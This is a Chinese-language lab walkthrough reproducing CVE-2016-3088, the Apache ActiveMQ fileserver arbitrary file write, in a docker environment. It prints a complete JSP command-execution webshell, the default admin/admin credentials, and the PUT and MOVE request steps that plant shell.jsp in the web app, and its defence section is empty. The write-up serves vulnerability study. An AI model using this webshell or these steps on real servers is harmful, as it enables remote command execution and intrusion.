# ActiveMQ任意文件写入漏洞 (CVE-2016-3088)

## 漏洞详情

ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。

fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：

1. 其使用率并不高
2. 文件操作容易出现漏洞

所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。

在测试过程中，可以关注ActiveMQ的版本，避免走弯路。



## 影响版本

**Apache ActiveMQ 5.x ~ 5.14.0**



## 环境搭建

```
cd activemq/CVE-2016-3088
docker-compose up -d
```

环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞就出现在web控制台中。

访问`http://your-ip:8161/`看到web页面，说明环境已成功运行。



## 漏洞复现

文件写入有几种利用方法：

1. 写入webshell
2. 写入cron或ssh key等文件
3. 写入jar或jetty.xml等库和配置文件

我们都尝试使用一下

### 写入webshell

写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问，所以比较鸡肋。

默认的ActiveMQ账号密码均为`admin`，首先访问下面的地址，查看ActiveMQ的绝对路径：

```
http://your-ip:8161/admin/test/systemProperties.jsp
```

![image-20210415184850259](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210415184850259.png)

然后上传webshell，这里我们选用jsp小马

这里访问`http://120.79.1.70:8161/fileserver/1.txt` 直接用bp拦截之后把post改成put 在往data后面加上jsp的小马

> 这里我们先将文件写入1.txt中，待会将这个文件移动到ActiveMQ的绝对路径中

```html
<%@ page import="java.util.*,java.io.*"%> <% %> 
<HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION="">
<INPUT TYPE="text" NAME="comment"> 
<INPUT TYPE="submit" VALUE="Send"> 
</FORM> <pre> 
<%
 if ( request.getParameter( "comment" ) != null )
 {
     out.println( "Command: " + request.getParameter( "comment" ) + "<BR>" );
     Process p        = Runtime.getRuntime().exec( request.getParameter( "comment" ) );
     OutputStream os    = p.getOutputStream();
     InputStream in        = p.getInputStream();
     DataInputStream dis    = new DataInputStream( in );
     String disr        = dis.readLine();
     while ( disr != null )
     {
         out.println( disr ); disr = dis.readLine();
     }
 }
 %>
 </pre> 
 </BODY></HTML>
```

![image-20210415190346660](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210415190346660.png)

访问一下，上传成功

![image-20210415190258376](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210415190258376.png)

返回204代表成功，之后再把put改成move 后面再加一行，将文件重命名为shell.jsp

```
Destination:file:///opt/activemq/webapps/api/shell.jsp
```

![image-20210415190147092](images/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2016-3088).assets/image-20210415190147092.png)

访问地址，成功解析

```
http://192.168.16.128:8161/api/
```

![image-20210415190523606](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210415190523606.png)























## 漏洞分析

ActiveMQ中的fileserver服务允许用户通过HTTP中的PUT方法上传文件到指定目录，构造PUT请求上传webshell到fileserver目录，然后通过MOVE方法将其移动到有执行权限的/admin目录中



## 防御与修复

